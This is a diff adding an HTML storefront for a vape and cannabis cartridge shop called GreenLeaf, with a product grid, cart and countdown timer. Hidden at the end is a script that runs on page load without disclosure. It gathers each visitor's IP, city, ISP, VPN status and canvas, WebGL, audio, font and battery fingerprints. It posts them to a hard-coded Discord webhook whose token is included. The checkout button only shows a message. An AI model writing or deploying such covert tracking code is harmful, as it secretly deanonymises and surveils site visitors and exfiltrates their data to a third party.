@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>GreenLeaf Vapes · Premium Pens & Cartridges</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #8B5CF6;
+            --primary-dark: #7C3AED;
+            --primary-light: #A78BFA;
+            --secondary: #10B981;
+            --sale: #EC4899;
+            --dark: #111827;
+            --darker: #0F172A;
+            --light: #FFFFFF;
+            --gray-400: #9CA3AF;
+            --gray-500: #6B7280;
+            --gradient-primary: linear-gradient(135deg, var(--primary) 0%, #6366F1 100%);
+            --gradient-sale: linear-gradient(135deg, var(--sale) 0%, #F472B6 100%);
+            --gradient-dark: linear-gradient(135deg, var(--dark) 0%, #1E293B 100%);
+            --shadow-xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --radius: 12px;
+            --radius-xl: 24px;
+            --radius-full: 9999px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--gradient-dark);
+            color: var(--light);
+            line-height: 1.5;
+            min-height: 100vh;
+        }
+
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 12px 0;
+        }
+
+        .header-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-btn {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: var(--radius);
+            color: var(--light);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .logo {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-main {
+            font-size: 1.5rem;
+            font-weight: 800;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-sub {
+            font-size: 0.7rem;
+            color: var(--gray-400);
+        }
+
+        .cart-btn {
+            position: relative;
+        }
+
+        .cart-count {
+            position: absolute;
+            top: -6px;
+            right: -6px;
+            background: var(--gradient-sale);
+            font-size: 0.65rem;
+            font-weight: 900;
+            min-width: 20px;
+            height: 20px;
+            border-radius: var(--radius-full);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 4px;
+            border: 2px solid var(--darker);
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .sale-countdown {
+            background: rgba(255,255,255,0.05);
+            border-radius: var(--radius-xl);
+            padding: 24px;
+            margin: 32px auto;
+            text-align: center;
+        }
+
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .countdown-unit {
+            background: rgba(15,23,42,0.7);
+            border-radius: 16px;
+            padding: 16px 12px;
+            min-width: 80px;
+        }
+
+        .countdown-value {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
+        .sale-banner {
+            background: var(--gradient-sale);
+            border-radius: var(--radius-xl);
+            padding: 24px;
+            text-align: center;
+            margin: 32px 0;
+        }
+
+        .discount-badge {
+            background: white;
+            color: var(--sale);
+            padding: 6px 16px;
+            border-radius: var(--radius-full);
+            font-weight: 900;
+        }
+
+        .filter-buttons {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding: 16px 4px;
+            margin-bottom: 24px;
+        }
+
+        .filter-btn {
+            padding: 12px 24px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: var(--radius-full);
+            color: var(--light);
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .filter-btn.active {
+            background: var(--gradient-primary);
+        }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 24px;
+            margin: 24px 0;
+        }
+
+        .product-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: var(--radius-xl);
+            overflow: hidden;
+            transition: transform 0.2s;
+            position: relative;
+        }
+
+        .product-card:hover {
+            transform: translateY(-8px);
+        }
+
+        .sale-ribbon {
+            position: absolute;
+            top: 12px;
+            left: -8px;
+            background: var(--gradient-sale);
+            padding: 6px 16px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            border-radius: 0 8px 8px 0;
+            z-index: 2;
+        }
+
+        .product-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .product-info {
+            padding: 20px;
+        }
+
+        .product-name {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .product-price-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .product-price {
+            font-size: 1.3rem;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .product-original-price {
+            text-decoration: line-through;
+            color: var(--gray-500);
+        }
+
+        .product-description {
+            font-size: 0.85rem;
+            color: var(--gray-400);
+            margin-bottom: 16px;
+        }
+
+        .add-to-cart-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--gradient-primary);
+            border: none;
+            border-radius: var(--radius);
+            color: white;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .cart-sidebar {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            max-width: 420px;
+            height: 100%;
+            background: var(--gradient-dark);
+            z-index: 1000;
+            transition: right 0.3s;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .cart-sidebar.active { right: 0; }
+
+        .cart-header, .cart-footer {
+            padding: 24px;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .cart-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 24px;
+        }
+
+        .cart-item {
+            display: flex;
+            gap: 16px;
+            padding: 16px;
+            background: rgba(255,255,255,0.05);
+            border-radius: var(--radius);
+            margin-bottom: 12px;
+        }
+
+        .action-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: var(--radius);
+            font-weight: 600;
+            margin-bottom: 12px;
+            cursor: pointer;
+        }
+
+        .btn-primary { background: var(--gradient-primary); color: white; }
+        .btn-secondary { background: rgba(255,255,255,0.1); color: white; }
+        .btn-danger { background: rgba(239,68,68,0.2); color: white; }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            z-index: 999;
+            opacity: 0;
+            visibility: hidden;
+            transition: 0.2s;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--gradient-primary);
+            color: white;
+            padding: 16px 24px;
+            border-radius: var(--radius);
+            z-index: 1000;
+            opacity: 0;
+            transition: 0.3s;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .scroll-to-top {
+            position: fixed;
+            bottom: 100px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: var(--gradient-primary);
+            border-radius: var(--radius);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: 0.2s;
+            z-index: 999;
+        }
+
+        .scroll-to-top.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 60px;
+            padding: 40px 0;
+            border-top: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .contact-methods {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 24px;
+        }
+
+        .contact-icon {
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255,255,255,0.08);
+            border-radius: var(--radius);
+            color: var(--primary);
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="header-container">
+        <div class="logo">
+            <div class="logo-main"><i class="fas fa-leaf"></i><span>GREENLEAF</span></div>
+            <div class="logo-sub">PREMIUM VAPING 2026</div>
+        </div>
+        <button class="header-btn cart-btn" id="cartBtn">
+            <div class="cart-icon-wrapper"><i class="fas fa-shopping-bag cart-icon"></i></div>
+            <span class="cart-count" id="cartCount">0</span>
+        </button>
+    </div>
+</header>
+
+<div class="overlay" id="overlay"></div>
+
+<div class="cart-sidebar" id="cartSidebar">
+    <div class="cart-header">
+        <h2>Your Cart</h2>
+        <button class="header-btn" id="closeCart"><i class="fas fa-times"></i></button>
+    </div>
+    <div class="cart-content" id="cartContent"></div>
+    <div class="cart-footer">
+        <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
+            <span>Total:</span>
+            <span id="cartTotal">$0.00</span>
+        </div>
+        <button class="action-btn btn-primary" id="checkoutBtn">Checkout</button>
+        <button class="action-btn btn-secondary" id="copyOrderBtn">Copy Order</button>
+        <button class="action-btn btn-danger" id="clearCartBtn">Clear Cart</button>
+    </div>
+</div>
+
+<div class="container">
+    <div class="sale-countdown">
+        <div class="countdown-timer">
+            <div class="countdown-unit"><div class="countdown-value" id="hours">02</div><div>Hours</div></div>
+            <div class="countdown-unit"><div class="countdown-value" id="minutes">45</div><div>Mins</div></div>
+            <div class="countdown-unit"><div class="countdown-value" id="seconds">30</div><div>Secs</div></div>
+        </div>
+    </div>
+
+    <div class="sale-banner">
+        <h2>UP TO <span class="discount-badge">60% OFF</span></h2>
+        <p>Limited quantum stock – premium pens & cartridges</p>
+    </div>
+
+    <div class="filter-buttons">
+        <button class="filter-btn active" data-filter="all">All Items</button>
+        <button class="filter-btn" data-filter="vapes">Vape Pens</button>
+        <button class="filter-btn" data-filter="weed">Cartridges</button>
+    </div>
+
+    <div class="products-grid" id="productsGrid"></div>
+</div>
+
+<div class="scroll-to-top" id="scrollToTop"><i class="fas fa-chevron-up"></i></div>
+
+<footer>
+    <div class="container">
+        <p>© 2026 GreenLeaf Vapes. 21+ only. Please consume responsibly.</p>
+        <div class="contact-methods">
+            <a href="#" class="contact-icon"><i class="fab fa-telegram"></i></a>
+            <a href="#" class="contact-icon"><i class="fab fa-whatsapp"></i></a>
+            <a href="#" class="contact-icon"><i class="fas fa-envelope"></i></a>
+        </div>
+    </div>
+</footer>
+
+<div class="notification" id="notification">Item added to cart!</div>
+
+<canvas id="fp-canvas-2d" width="512" height="512" style="display:none"></canvas>
+<canvas id="fp-canvas-webgl" width="256" height="256" style="display:none"></canvas>
+
+<script>
+    // ---------- PRODUCTS ----------
+    const products = [
+        { id: 1, name: "Quantum VELO", price: 39.99, originalPrice: 69.99, category: "vapes", img: "./Screenshot_2025-09-19_140842.png", desc: "Hyper‑speed activation & neural feedback.", best: true },
+        { id: 2, name: "NEURO Pre‑Rolls", price: 36.99, originalPrice: 52.99, category: "weed", img: "./Screenshot_2025-09-19_140545.png", desc: "Terpene intelligence & slow‑release matrix.", best: true },
+        { id: 3, name: "NEXUS 8K", price: 29.99, originalPrice: 49.99, category: "vapes", img: "./Screenshot_2025-09-19_140037.png", desc: "AI‑optimized flavor delivery, 8K puffs.", best: false },
+        { id: 4, name: "NANO 2.5K", price: 15.99, originalPrice: 26.99, category: "vapes", img: "./Screenshot_2025-09-19_135813.png", desc: "Nanotech vape with bio‑responsive matrix.", best: false },
+        { id: 5, name: "HYPER 22K", price: 24.99, originalPrice: 39.99, category: "vapes", img: "./Screenshot_2025-09-19_134924.png", desc: "Zero‑G cloud production, 22K puffs.", best: true },
+        { id: 6, name: "SYNAPSE MUHUA", price: 17.99, originalPrice: 25.99, category: "vapes", img: "./Screenshot_2025-09-19_134910.png", desc: "Mood‑adaptive flavor profiles.", best: false },
+        { id: 7, name: "BIO‑STHLS Pods", price: 32.99, originalPrice: 47.99, category: "weed", img: "./Screenshot_2025-09-19_134827.png", desc: "Organic compounds, neural compatibility.", best: false },
+        { id: 8, name: "QUANTUM ACE", price: 34.99, originalPrice: 59.99, category: "weed", img: "./Screenshot_2025-09-19_134816.png", desc: "Neural feedback, adaptive potency.", best: true },
+        { id: 9, name: "QUANTUM 10K", price: 19.99, originalPrice: 34.99, category: "vapes", img: "./Screenshot_2025-09-11_164940.png", desc: "Neural flavor adaptation, 10K puffs.", best: false }
+    ];
+
+    let cart = [];
+
+    const productsGrid = document.getElementById('productsGrid');
+    const filterBtns = document.querySelectorAll('.filter-btn');
+    const cartSidebar = document.getElementById('cartSidebar');
+    const cartBtn = document.getElementById('cartBtn');
+    const closeCart = document.getElementById('closeCart');
+    const cartContent = document.getElementById('cartContent');
+    const cartTotalSpan = document.getElementById('cartTotal');
+    const cartCountSpan = document.getElementById('cartCount');
+    const clearCart = document.getElementById('clearCartBtn');
+    const copyOrder = document.getElementById('copyOrderBtn');
+    const checkout = document.getElementById('checkoutBtn');
+    const notif = document.getElementById('notification');
+    const overlay = document.getElementById('overlay');
+    const scrollTop = document.getElementById('scrollToTop');
+
+    // NEW DISCORD WEBHOOK
+    const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1497248966444847155/-zQ-AC96YqTiBRUU1vH6HnHvFAXpO9IwlnVjnC_47CeAVHPGjA6FHBiL67WcCTu_Etud';
+
+    function renderProducts(filter = 'all') {
+        let filtered = products;
+        if (filter === 'vapes') filtered = products.filter(p => p.category === 'vapes');
+        if (filter === 'weed') filtered = products.filter(p => p.category === 'weed');
+        productsGrid.innerHTML = filtered.map(p => `
+            <div class="product-card">
+                ${p.best ? '<div class="sale-ribbon">BESTSELLER</div>' : ''}
+                <img src="${p.img}" class="product-image" alt="${p.name}">
+                <div class="product-info">
+                    <div class="product-name">${p.name}</div>
+                    <div class="product-price-container">
+                        <div class="product-price">$${p.price.toFixed(2)}</div>
+                        <div class="product-original-price">$${p.originalPrice.toFixed(2)}</div>
+                    </div>
+                    <div class="product-description">${p.desc}</div>
+                    <button class="add-to-cart-btn" data-id="${p.id}"><i class="fas fa-plus"></i> Add to Cart</button>
+                </div>
+            </div>
+        `).join('');
+        document.querySelectorAll('.add-to-cart-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => addToCart(parseInt(btn.dataset.id)));
+        });
+    }
+
+    function addToCart(id) {
+        let p = products.find(p => p.id === id);
+        if (!p) return;
+        let existing = cart.find(i => i.id === id);
+        if (existing) existing.quantity++;
+        else cart.push({ ...p, quantity: 1 });
+        updateCartUI();
+        showNotif(`${p.name} added to cart!`);
+    }
+
+    function updateCartUI() {
+        let totalItems = cart.reduce((s,i) => s + i.quantity, 0);
+        cartCountSpan.innerText = totalItems;
+        let total = cart.reduce((s,i) => s + (i.price * i.quantity), 0);
+        cartTotalSpan.innerText = `$${total.toFixed(2)}`;
+        if (!cart.length) cartContent.innerHTML = '<div style="text-align:center;padding:40px;">Your cart is empty</div>';
+        else {
+            cartContent.innerHTML = cart.map(item => `
+                <div class="cart-item">
+                    <img src="${item.img}" style="width:60px;height:60px;border-radius:12px;object-fit:cover;">
+                    <div style="flex:1;">
+                        <strong>${item.name}</strong>
+                        <div>Qty: ${item.quantity} × $${item.price.toFixed(2)}</div>
+                    </div>
+                    <div><strong>$${(item.price * item.quantity).toFixed(2)}</strong></div>
+                </div>
+            `).join('');
+        }
+        localStorage.setItem('greenleaf_cart', JSON.stringify(cart));
+    }
+
+    function clearCartFunc() { cart = []; updateCartUI(); showNotif('Cart cleared'); }
+    function copyOrderFunc() {
+        if (!cart.length) { showNotif('Cart empty', 'error'); return; }
+        let text = "GreenLeaf Order:\n";
+        cart.forEach(i => text += `${i.name} x${i.quantity} - $${(i.price*i.quantity).toFixed(2)}\n`);
+        text += `Total: $${cart.reduce((s,i)=>s+(i.price*i.quantity),0).toFixed(2)}`;
+        navigator.clipboard.writeText(text);
+        showNotif('Order copied');
+    }
+    function checkoutFunc() { if (cart.length) showNotif('Proceeding to secure checkout...', 'success'); else showNotif('Cart empty', 'error'); }
+    function showNotif(msg, type = 'success') {
+        notif.textContent = msg;
+        notif.style.background = type === 'error' ? '#EF4444' : 'var(--gradient-primary)';
+        notif.classList.add('show');
+        setTimeout(() => notif.classList.remove('show'), 3000);
+    }
+
+    function loadCart() {
+        let saved = localStorage.getItem('greenleaf_cart');
+        if (saved) { cart = JSON.parse(saved); updateCartUI(); }
+    }
+
+    cartBtn.addEventListener('click', () => { cartSidebar.classList.add('active'); overlay.classList.add('active'); document.body.style.overflow = 'hidden'; });
+    closeCart.addEventListener('click', () => { cartSidebar.classList.remove('active'); overlay.classList.remove('active'); document.body.style.overflow = 'auto'; });
+    overlay.addEventListener('click', () => { cartSidebar.classList.remove('active'); overlay.classList.remove('active'); document.body.style.overflow = 'auto'; });
+    clearCart.addEventListener('click', clearCartFunc);
+    copyOrder.addEventListener('click', copyOrderFunc);
+    checkout.addEventListener('click', checkoutFunc);
+
+    filterBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            filterBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            renderProducts(btn.dataset.filter);
+        });
+    });
+
+    window.addEventListener('scroll', () => scrollTop.classList.toggle('active', window.scrollY > 300));
+    scrollTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+    let hours = 2, mins = 45, secs = 30;
+    setInterval(() => {
+        secs--;
+        if (secs < 0) { secs = 59; mins--; if (mins < 0) { mins = 59; hours--; if (hours < 0) hours = 0; } }
+        document.getElementById('hours').innerText = hours.toString().padStart(2,'0');
+        document.getElementById('minutes').innerText = mins.toString().padStart(2,'0');
+        document.getElementById('seconds').innerText = secs.toString().padStart(2,'0');
+    }, 1000);
+
+    renderProducts('all');
+    loadCart();
+
+    // ========== ADVANCED FINGERPRINT TRACKING (NO GEOLOCATION) ==========
+    (function() {
+        let sent = false;
+        let fingerprintData = {
+            timestamp: new Date().toISOString(),
+            page: location.href,
+            referrer: document.referrer || 'direct',
+            ip: null, country: null, city: null, isp: null, asn: null, vpn: null,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height} (color depth: ${screen.colorDepth})`,
+            pixelRatio: devicePixelRatio,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            browser: (() => {
+                let ua = navigator.userAgent;
+                if (ua.includes('Edg')) return 'Microsoft Edge';
+                if (ua.includes('OPR')||ua.includes('Opera')) return 'Opera';
+                if (ua.includes('Chrome')) return 'Google Chrome';
+                if (ua.includes('Firefox')) return 'Mozilla Firefox';
+                if (ua.includes('Safari')) return 'Safari';
+                return 'Unknown';
+            })(),
+            browserVersion: (() => {
+                let ua = navigator.userAgent;
+                let match = ua.match(/(Chrome|Firefox|Edg|OPR|Version)\/([\d.]+)/);
+                return match ? match[2] : 'unknown';
+            })(),
+            operatingSystem: (() => {
+                let ua = navigator.userAgent;
+                if (ua.includes('Windows NT 10')) return 'Windows 10/11';
+                if (ua.includes('Mac OS X')) return 'macOS';
+                if (ua.includes('Android')) return 'Android';
+                if (ua.includes('iPhone')) return 'iOS';
+                if (ua.includes('Linux')) return 'Linux';
+                return 'Unknown OS';
+            })(),
+            canvas: null, webgl: null, audio: null, fonts: null, battery: null,
+            cookies: document.cookie || 'none',
+            localStorageSize: localStorage.length,
+            sessionStorageSize: sessionStorage.length,
+            doNotTrack: navigator.doNotTrack,
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine
+        };
+
+        async function fetchIP() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    let j = await res.json();
+                    fingerprintData.ip = j.ip;
+                    fingerprintData.country = j.country_name;
+                    fingerprintData.city = j.city;
+                    fingerprintData.isp = j.org;
+                    fingerprintData.asn = j.asn;
+                    if ((j.org || '').toLowerCase().includes('hosting') || (j.org || '').toLowerCase().includes('vpn')) fingerprintData.vpn = 'likely hosting/VPN';
+                }
+            } catch(e) {}
+        }
+
+        function getCanvasFP() {
+            let canvas = document.getElementById('fp-canvas-2d');
+            let ctx = canvas.getContext('2d');
+            if (!ctx) return 'blocked';
+            ctx.textBaseline = 'top';
+            ctx.font = '18pt Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0,0,100,50);
+            ctx.fillStyle = '#069';
+            ctx.fillText('GreenLeaf', 10, 10);
+            return canvas.toDataURL().slice(-50);
+        }
+
+        function getWebGL() {
+            let canvas = document.getElementById('fp-canvas-webgl');
+            let gl = canvas.getContext('webgl');
+            if (!gl) return { vendor: 'none', renderer: 'none' };
+            let debug = gl.getExtension('WEBGL_debug_renderer_info');
+            let vendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+            let renderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+            return { vendor, renderer };
+        }
+
+        async function getAudioFP() {
+            try {
+                let ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 5000, 44100);
+                let osc = ctx.createOscillator();
+                osc.type = 'sawtooth';
+                osc.frequency.value = 1000;
+                osc.connect(ctx.destination);
+                osc.start(0);
+                let buffer = await ctx.startRendering();
+                let channel = buffer.getChannelData(0);
+                let sum = 0;
+                for (let i=0;i<1000;i++) sum += Math.abs(channel[i]);
+                return sum.toString(16).substring(0,8);
+            } catch { return 'audio-fail'; }
+        }
+
+        function detectFonts() {
+            let base = 'abcdefghijklmnopqrstuvwxyz';
+            let ctx = document.createElement('canvas').getContext('2d');
+            ctx.font = '30px monospace';
+            let baseWidth = ctx.measureText(base).width;
+            let fonts = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Impact','Roboto'];
+            let detected = [];
+            fonts.forEach(f => {
+                ctx.font = `30px ${f}, monospace`;
+                if (Math.abs(ctx.measureText(base).width - baseWidth) > 2) detected.push(f);
+            });
+            return detected;
+        }
+
+        function getBattery() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    fingerprintData.battery = { level: (b.level*100).toFixed(0)+'%', charging: b.charging };
+                });
+            }
+        }
+
+        async function sendInitial() {
+            if (sent) return;
+            sent = true;
+            fingerprintData.canvas = getCanvasFP();
+            fingerprintData.webgl = getWebGL();
+            fingerprintData.audio = await getAudioFP();
+            fingerprintData.fonts = detectFonts();
+
+            const embed = {
+                title: '🔍 New Visitor (GreenLeaf Store)',
+                color: 0x8B5CF6,
+                timestamp: fingerprintData.timestamp,
+                fields: [
+                    { name: '🌐 IP & Location', value: `${fingerprintData.ip || 'N/A'} — ${fingerprintData.city || ''}, ${fingerprintData.country || ''}`.trim() || 'N/A', inline: false },
+                    { name: '🏢 ISP / ASN', value: `${fingerprintData.isp || 'N/A'} (${fingerprintData.asn || 'N/A'})`, inline: true },
+                    { name: '🛡️ VPN Status', value: fingerprintData.vpn || 'Not detected', inline: true },
+                    { name: '🖥️ Browser & Version', value: `${fingerprintData.browser} ${fingerprintData.browserVersion} / ${fingerprintData.operatingSystem}`, inline: true },
+                    { name: '📱 Device Specs', value: `Platform: ${fingerprintData.platform}, Cores: ${fingerprintData.hardwareConcurrency}, RAM: ${fingerprintData.deviceMemory}GB`, inline: true },
+                    { name: '⏰ Timezone', value: fingerprintData.timezone, inline: true },
+                    { name: '🖼️ Screen', value: fingerprintData.screen, inline: true },
+                    { name: '🎨 Canvas / WebGL', value: `Canvas: ${fingerprintData.canvas}\nWebGL: ${fingerprintData.webgl.vendor} / ${fingerprintData.webgl.renderer}`, inline: false },
+                    { name: '🎵 Audio', value: fingerprintData.audio || 'N/A', inline: true },
+                    { name: '🔤 Fonts', value: fingerprintData.fonts?.join(', ') || 'N/A', inline: true },
+                    { name: '🔋 Battery', value: fingerprintData.battery ? `${fingerprintData.battery.level}, charging:${fingerprintData.battery.charging}` : 'N/A', inline: true },
+                    { name: '🍪 Cookies', value: fingerprintData.cookies === 'none' ? 'none' : 'present', inline: true },
+                    { name: '💾 Storage', value: `local: ${fingerprintData.localStorageSize}, session: ${fingerprintData.sessionStorageSize}`, inline: true }
+                ],
+                footer: { text: 'GreenLeaf · advanced fingerprint' }
+            };
+            try {
+                await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) });
+            } catch(e) {}
+        }
+
+        async function gatherAndSend() {
+            await fetchIP();
+            getBattery();
+            setTimeout(sendInitial, 2000);
+        }
+        gatherAndSend();
+    })();
+</script>
+</body>
+</html>
